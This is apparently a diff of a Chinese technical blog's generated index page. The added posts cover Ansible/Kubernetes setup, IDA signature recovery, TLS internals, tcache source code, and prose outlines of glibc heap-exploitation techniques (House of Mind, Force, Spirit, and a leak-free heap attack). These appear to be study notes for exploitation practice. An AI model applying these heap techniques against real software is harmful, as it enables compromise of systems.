+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
+      
+  
+    <h1 class="title"><a href="/2018/12/11/分布式/">分布式搭建</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="ansible安装"><a href="#ansible安装" class="headerlink" title="ansible安装"></a>ansible安装</h1><h2 id="安装ansible"><a href="#安装ansible" class="headerlink" title="安装ansible"></a>安装ansible</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install virtualenv</span><br><span class="line">virtualenv --no-site-packages venv</span><br><span class="line">source venv/bin/active</span><br><span class="line">pip install ansbile</span><br></pre></td></tr></table></figure>
+<p>ansbile主机配置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[test]</span><br><span class="line">127.0.0.1 ansible_ssh_user=aaa ansible_ssh_port=22 ansible_ssh_pass=aaa</span><br></pre></td></tr></table></figure>
+<p>注释这么配置不好，但初始这样配置，为了之后批量分发，分发后请删除这个账户</p>
+<p>ansbile批量推送公钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line"> ansible-playbook   -i hosts   ssh.yml</span><br></pre></td></tr></table></figure>
+<p>推送文件ssh.yml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Using alternate directory locations:</span><br><span class="line"> - hosts: test</span><br><span class="line">   user: aaa</span><br><span class="line">   tasks:</span><br><span class="line">    - name: ssh-copy</span><br><span class="line">      authorized_key: user=aaa key=&quot;&#123;&#123; lookup(&apos;file&apos;, &apos;/home/aaa/.ssh/id_rsa.pub&apos;) &#125;&#125;&quot;</span><br><span class="line">      tags:</span><br><span class="line">        - sshkey</span><br></pre></td></tr></table></figure>
+<p>执行代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible  test -i ./hosts  -m command -a &quot;echo &apos;aa&apos;&quot;</span><br></pre></td></tr></table></figure>
+<h1 id="k8s安装（需要翻墙）"><a href="#k8s安装（需要翻墙）" class="headerlink" title="k8s安装（需要翻墙）"></a>k8s安装（需要翻墙）</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install -y apt-transport-https curl</span><br><span class="line">curl -s https://packages.cloud.google.com/apt/doc/apt-key.gpg | apt-key add -</span><br><span class="line">cat &lt;&lt;EOF &gt;/etc/apt/sources.list.d/kubernetes.list</span><br><span class="line">deb https://apt.kubernetes.io/ kubernetes-xenial main</span><br><span class="line">EOF</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install -y kubelet kubeadm kubectl kubernetes-cni docker.io </span><br><span class="line">apt-mark hold kubelet kubeadm kubectl</span><br></pre></td></tr></table></figure>
+<p>配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: kubeadm.k8s.io/v1alpha2</span><br><span class="line">kind: MasterConfiguration</span><br><span class="line">api:</span><br><span class="line">  advertiseAddress: 0.0.0.0</span><br><span class="line">networking:</span><br><span class="line">  podSubnet: 10.244.0.0/16</span><br><span class="line">etcd:</span><br><span class="line">  image: registry.cn-hangzhou.aliyuncs.com/google_containers/etcd-amd64:3.1.11</span><br><span class="line">kubernetesVersion: v1.12.1</span><br><span class="line">imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers</span><br><span class="line"></span><br><span class="line">imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo swapoff -a</span><br><span class="line">　1. 为docker服务创建一个内嵌的systemd目录</span><br><span class="line"></span><br><span class="line">$ mkdir -p /etc/systemd/system/docker.service.d</span><br><span class="line"></span><br><span class="line">　　2. 创建/etc/systemd/system/docker.service.d/http-proxy.conf文件，并添加HTTP_PROXY环境变量。其中[proxy-addr]和[proxy-port]分别改成实际情况的代理地址和端口：</span><br><span class="line">　　</span><br><span class="line">[Service]</span><br><span class="line">Environment=&quot;HTTP_PROXY=http://[proxy-addr]:[proxy-port]/&quot; &quot;HTTPS_PROXY=http://[proxy-addr]:[proxy-port]/&quot;</span><br><span class="line">$ systemctl daemon-reload</span><br><span class="line">$ systemctl restart docker</span><br><span class="line">sudo kubeadm init --config ./kubeadm.conf</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/k8s-manifests/kube-flannel-legacy.yml</span><br><span class="line">需要安装flannel</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
+      
+  
+    <h1 class="title"><a href="/2018/12/11/符号表恢复/">符号表恢复</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="符号表恢复"><a href="#符号表恢复" class="headerlink" title="符号表恢复"></a>符号表恢复</h1><h2 id="flair"><a href="#flair" class="headerlink" title="flair"></a>flair</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pelf.exe ./libgmp.a ./a.pat</span><br><span class="line">skipped 1, total 510</span><br><span class="line">sigmake.exe ./a.pat b.sig</span><br><span class="line">b.sig: modules/leaves: 462/509, COLLISIONS: 3</span><br><span class="line">See the documentation to learn how to resolve collisions.</span><br></pre></td></tr></table></figure>
+<h2 id="rizzo"><a href="#rizzo" class="headerlink" title="rizzo"></a>rizzo</h2><p>安装rizzo插件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arm架构的libc在 /usr/arm-linux-gnueabihf/lib里面</span><br><span class="line">file--&gt;Produce file--&gt;Rizzo signature file使用rizzo</span><br><span class="line"> file--&gt;Load file--&gt;Rizzo signature file加载符号</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
+      
+  
+    <h1 class="title"><a href="/2018/12/11/堆溢出/">堆溢出</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>House of Prime<br>House of Mind<br>House of Force<br>House of Lore<br>House of Spirit<br>House of Mind</p>
+<h1 id="House-of-Mind"><a href="#House-of-Mind" class="headerlink" title="House of Mind"></a>House of Mind</h1><p>这个技巧中，攻击者欺骗 glibc malloc 来使用由他伪造的 arena。伪造的 arena 以这种形式构造，unsorted bin 的 fd 包含free的 GOT 条目地址 -12。因此现在当漏洞程序释放某个块的时候，free的 GOT 条目被覆盖为 shellcode 的地址。在成功覆盖 GOT 之后，当漏洞程序调用free，shellcode 就会执行。</p>
+<h1 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h1><p>这个技巧中，攻击者滥用 top 块的大小，并欺骗 glibc malloc 使用 top 块来服务于一个非常大的内存请求（大于堆系统内存大小）。现在当新的 malloc 请求产生时，free的 GOT 表就会覆盖为 shellcode 地址。因此从现在开始，无论free何时调用，shellcode 都会执行。</p>
+<h1 id="House-of-Force-1"><a href="#House-of-Force-1" class="headerlink" title="House of Force"></a>House of Force</h1><p>这个技巧中，攻击者滥用 top 块的大小，并欺骗 glibc malloc 使用 top 块来服务于一个非常大的内存请求（大于堆系统内存大小）。现在当新的 malloc 请求产生时，free的 GOT 表就会覆盖为 shellcode 地址。因此从现在开始，无论free何时调用，shellcode 都会执行。</p>
+<h1 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h1><p>在这个技巧中，攻击者欺骗 glibc malloc 来返回一个块，它位于栈中（而不是堆中）。这允许攻击者覆盖储存在栈中的返回地址。</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
+      
+  
+    <h1 class="title"><a href="/2018/12/11/windows机制/">windows机制</a></h1>
   
 
     </header>
@@ -1120,7 +737,7 @@ sehop检测链表最后一个函数是不是默认处理函数可以伪造链表
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -1140,11 +757,10 @@ sehop检测链表最后一个函数是不是默认处理函数可以伪造链表
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/windbg学习总结/">windbg学习总结</a></h1>
+    <h1 class="title"><a href="/2018/12/11/windbg学习总结/">windbg学习总结</a></h1>
   
 
     </header>
@@ -1187,7 +803,7 @@ ctrl+n 找到DISPCALLFUNC
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -1207,11 +823,10 @@ ctrl+n 找到DISPCALLFUNC
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/web/">随意码的web</a></h1>
+    <h1 class="title"><a href="/2018/12/11/web/">随意码的web</a></h1>
   
 
     </header>
@@ -1351,7 +966,7 @@ for i in range(1, 80):
     <footer>
         <div class="alignright">
           
-
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
         </div>
         
         
@@ -1371,11 +986,241 @@ for i in range(1, 80):
     <header>
       
         <div class="icon"></div>
-     
-      
+        
       
   
-    <h1 class="title"><a href="/2018/10/21/rtd/">return-to-dl-reslove</a></h1>
+    <h1 class="title"><a href="/2018/12/11/unleak/">unleak利用</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>不基于信息泄露的堆利用方法</p>
+<p>首先，假设可以申请任意长度的堆块，并且存在漏洞，申请后的堆块可以使用。</p>
+<p>我们通过漏洞制造fastbin中的堆块与unsortbin中的堆块重合。（可以用roman）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0 ◂— 0x10</span><br><span class="line">0x30: 0 ◂— 0x10</span><br><span class="line">0x40: 0 ◂— 0x10</span><br><span class="line">0x50: 0 ◂— 0x10</span><br><span class="line">0x60: 0 ◂— 0x10</span><br><span class="line">0x70: 0x5866c0 —▸ 0 ◂— 0x10</span><br><span class="line">0x80: 0 ◂— 0x10</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x586530 ◂— 0x7f7eb0d07b58</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>
+<p>然后申请堆块，使得unsortedbin与fastbins重合，导致fastbin的指针指向main_arena，</p>
+<p>接着，通过局部覆盖使得fastbin指向malloc_hook前面</p>
+<p>然后设置malloc_hook大小，然后通过unsortbin attach 狙击main_arena，然后改变大小</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
+      
+  
+    <h1 class="title"><a href="/2018/12/11/tls/">tls</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="tls"><a href="#tls" class="headerlink" title="tls"></a>tls</h1><p>线程本地存储</p>
+<p>Linux的glibc使用GS寄存器来访问TLS，GS指向TEB，gs寄存器在线程切换时并不改变，而是采用更改相应偏移中内容，来切换。</p>
+<p>另外对于线程来说，他的栈是有限的，是用过mmap创建的。</p>
+<p>这是我修改过用来测试的代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">__thread int var = 0;   // var定义为线程变量，每个数线拥有一份，这玩意不初始化在tbss，初始化在tdata</span><br><span class="line"></span><br><span class="line">void* worker(void* arg);  </span><br><span class="line"></span><br><span class="line">int main()&#123;  </span><br><span class="line">    pthread_t pid1,pid2;  </span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;pid1,NULL,worker,(void *)0);  </span><br><span class="line">    pthread_create(&amp;pid2,NULL,worker,(void *)1);  </span><br><span class="line"></span><br><span class="line">    pthread_join(pid1,NULL);  </span><br><span class="line">    pthread_join(pid2,NULL);  </span><br><span class="line"></span><br><span class="line">    return 0;  </span><br><span class="line">&#125;  </span><br><span class="line">void* worker(void* arg)&#123;  </span><br><span class="line">    int idx = (int)arg;</span><br><span class="line">    int i=0;</span><br><span class="line">    int j=0;</span><br><span class="line">    int e=0;</span><br><span class="line">    while(1) &#123;</span><br><span class="line">	i++;</span><br><span class="line">	j++;</span><br><span class="line"></span><br><span class="line">	e++;</span><br><span class="line">	var++;</span><br><span class="line"> asm volatile(&quot;mov %fs:0,%rax;&quot;);  </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>TLS如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">线程2的tls如下 </span><br><span class="line">0x7ffff77ef700是fs:[0]可以看到他指向自己，在栈底（这个偏移是固定的，如果找不到地址，那么从栈底往上找一下就好）</span><br><span class="line">0x7ffff77ef6f0:	0x0000000000000000	0x0003cb0300000000</span><br><span class="line">0x7ffff77ef700:	0x00007ffff77ef700	0x0000000000602020</span><br><span class="line">0x7ffff77ef710:	0x00007ffff77ef700	0x0000000000000001</span><br><span class="line">0x7ffff77ef720:	0x0000000000000000	0x3388f717cab24000</span><br><span class="line">0x7ffff77ef730:	0x86ad80d7b8682fb4	0x0000000000000000</span><br><span class="line">0x7ffff77ef740:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff77ef750:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff77ef760:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff77ef770:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>创建线程后的栈</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">主线程</span><br><span class="line">RBP  0x7fffffffded0 —▸ 0x4007c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"> RSP  0x7fffffffdeb0 —▸ 0x4007c0 (__libc_csu_init) ◂— push   r15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">thread1</span><br><span class="line">*RBP  0x7ffff77eef50 ◂— 0x0</span><br><span class="line">*RSP  0x7ffff77eef50 ◂— 0x0</span><br></pre></td></tr></table></figure>
+<p>内存如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">         0x400000           0x401000 r-xp     1000 0      /home/j/2</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/j/2</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/j/2</span><br><span class="line">          0x602000           0x623000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7ffff6fef000     0x7ffff6ff0000 ---p     1000 0      </span><br><span class="line">    0x7ffff6ff0000     0x7ffff77f0000 rw-p   800000 0      </span><br><span class="line">    0x7ffff77f0000     0x7ffff79b0000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff79b0000     0x7ffff7bb0000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bb0000     0x7ffff7bb4000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bb4000     0x7ffff7bb6000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line">    0x7ffff7bb6000     0x7ffff7bba000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7bba000     0x7ffff7bd2000 r-xp    18000 0      /lib/x86_64-linux-gnu/libpthread-2.23.so</span><br><span class="line">    0x7ffff7bd2000     0x7ffff7dd1000 ---p   1ff000 18000  /lib/x86_64-linux-gnu/libpthread-2.23.so</span><br><span class="line">    0x7ffff7dd1000     0x7ffff7dd2000 r--p     1000 17000  /lib/x86_64-linux-gnu/libpthread-2.23.so</span><br><span class="line">    0x7ffff7dd2000     0x7ffff7dd3000 rw-p     1000 18000  /lib/x86_64-linux-gnu/libpthread-2.23.so</span><br><span class="line">    0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7fdb000     0x7ffff7fdf000 rw-p     4000 0      </span><br><span class="line">    0x7ffff7ff8000     0x7ffff7ffa000 r--p     2000 0      [vvar]</span><br><span class="line">    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000 0      </span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000 0      [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]</span><br></pre></td></tr></table></figure>
+<p>worker代码，可以看到，对于thread类的变量，使用fs来存储的，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    eax, dword ptr fs:[0xfffffffffffffffc]</span><br><span class="line"> ► 0x4007e4 &lt;worker+36&gt;    add    eax, 1</span><br><span class="line">   0x4007e7 &lt;worker+39&gt;    mov    dword ptr fs:[0xfffffffffffffffc], eax</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        
+      
+  
+    <h1 class="title"><a href="/2018/12/11/tcache/">tcache</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h1 id="tcache源码"><a href="#tcache源码" class="headerlink" title="tcache源码"></a>tcache源码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">static __thread char tcache_shutting_down = 0;</span><br><span class="line">static __thread tcache_perthread_struct *tcache = NULL;</span><br><span class="line">线程变量</span><br><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  char counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
+<p>采用后释放先使用的原则</p>
+<h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      return tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>如果size小于tcache大小，并且tcache机制打开，并且tcache相应的大小存在chunk就返回tcache</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tcache_get (size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; 0);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  return (void *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果大小小于最大值，直接以单链表的方式卸载chunk，并且不检查大小，可以看到tcache是个不检查大小的fastbin。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">      if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = &quot;malloc(): memory corruption (fast)&quot;;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              return NULL;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">	  /* While we&apos;re here, if we see other chunks of the same size,</span><br><span class="line">	     stash them in the tcache.  */</span><br><span class="line">	  size_t tc_idx = csize2tidx (nb);</span><br><span class="line">	  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="line">	      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (pp = *fb) != NULL)</span><br><span class="line">		&#123;</span><br><span class="line">		  REMOVE_FB (fb, tc_victim, pp);</span><br><span class="line">		  if (tc_victim != 0)</span><br><span class="line">		    &#123;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  if (tc_victim != 0)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      if (av != &amp;main_arena)</span><br><span class="line">	set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>fastbin结束后会把同样大小的其他chunk放入tcache（smallbin也一样不再重复贴了，unlnik贴一下）</p>
